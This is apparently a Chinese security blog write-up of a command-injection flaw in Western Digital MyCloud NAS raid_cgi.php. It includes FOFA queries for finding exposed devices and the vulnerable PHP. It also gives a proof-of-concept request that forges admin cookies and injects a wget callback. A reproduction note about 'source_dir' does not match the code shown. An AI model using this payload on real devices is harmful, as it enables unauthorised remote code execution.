---
title: "西部数码 NAS raid_cgi.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-raid_cgi-rce.html
asset_dir: assets/西部数码-nas-raid_cgi.php-命令执行漏洞
---

# 西部数码 NAS raid\_cgi.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/12 13:08
* 560浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

授权

物流软件安全

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS raid\_cgi.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

编码转换工具

Web安全课程

网络安全课程

直接看 `raid_cgi.php` 其业务实现逻辑如下

```
<?php
//session_start();
//$r = new stdClass();
//$r->success = false;
//
//include ("../lib/login_checker.php");
//
///* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
//if (login_check() != 1)
//{
//  echo json_encode($r);
//  exit;
//}

$action = $_POST['cmd'];
if ($action == "") $action = $_GET['cmd'];

$r = new stdClass();
switch ($action)
{
    case "cgi_Run_Smart_Test":
    {
       $run_cmd = $_POST['run_cmd'];
       system("smart_test -X > /dev/null");

       $run_cmd .= " > /dev/null &";
       system($run_cmd);
       sleep(3);

       $r->run_cmd = $run_cmd;
       $r->ret = $ret;
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "cgi_Get_SysInfo":
    {
       $_TMP_SYSINFO_XML = "/var/www/xml/_tmp_sysinfo.xml";
       system("xmldbc  -p /disks $_TMP_SYSINFO_XML -S /var/run/xmldb_sock_sysinfo");
       echo file_get_contents($_TMP_SYSINFO_XML);
       @unlink($_TMP_SYSINFO_XML);
    }
       break;
}
?>
```

当**cmd=cgi\_Run\_Smart\_Test**时，`$run_cmd` 是直接拼接进**system**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞修复方案

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错

```
POST /web/storage/raid_cgi.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

cmd=cgi_Run_Smart_Test&run_cmd=$(wget raid.cgi.dnslog.pt)
```

[![西部数码 NAS raid_cgi.php 命令执行漏洞](images/img-001-fa6d0b2033c0.webp)](https://image.mrxn.net/5ac08412a35944de866915b0139bc40a.webp)

成功在DNSLOG平台收到DNS和HTTP请求

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS raid\_cgi.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-raid_cgi-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-raid_cgi-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-raid\_cgi-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-raid\_cgi-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 